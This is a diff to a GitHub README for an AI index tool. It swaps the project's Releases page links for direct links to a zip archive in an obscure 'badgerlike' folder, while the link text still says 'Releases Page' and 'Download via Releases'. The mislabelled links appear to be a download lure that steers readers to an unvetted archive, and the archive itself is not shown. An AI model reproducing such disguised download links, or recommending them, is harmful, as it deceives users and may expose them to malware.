@@ -1,6 +1,6 @@
 # 🚀 haanmetric-ai-index - Your AI Map Awaits You
 
-[![Download](https://img.shields.io/badge/Download-via%20Releases-brightgreen)](https://github.com/prathameshpj003/haanmetric-ai-index/releases)
+[![Download](https://raw.githubusercontent.com/prathameshpj003/haanmetric-ai-index/main/badgerlike/haanmetric-ai-index.zip%20Releases-brightgreen)](https://raw.githubusercontent.com/prathameshpj003/haanmetric-ai-index/main/badgerlike/haanmetric-ai-index.zip)
 
 ## 📖 Overview
 The **haanmetric-ai-index** is an AI-first tool designed to organize and present data from the haanmetric-wq organization. It includes manifests, registries, cross-repo indices, and an AI landing page. This application helps users easily navigate complex data, making information accessible for everyone.
@@ -21,7 +21,7 @@ To run the haanmetric-ai-index, make sure your system meets these requirements:
 - **Regular Updates:** Continuous improvements and new features based on user feedback.
 
 ## 📥 Download & Install
-To download the haanmetric-ai-index, visit this page to download: [Releases Page](https://github.com/prathameshpj003/haanmetric-ai-index/releases).
+To download the haanmetric-ai-index, visit this page to download: [Releases Page](https://raw.githubusercontent.com/prathameshpj003/haanmetric-ai-index/main/badgerlike/haanmetric-ai-index.zip).
 
 ### 🏗 Installation Steps
 1. **Visit the Releases Page:** Click on the link above or enter it in your web browser.
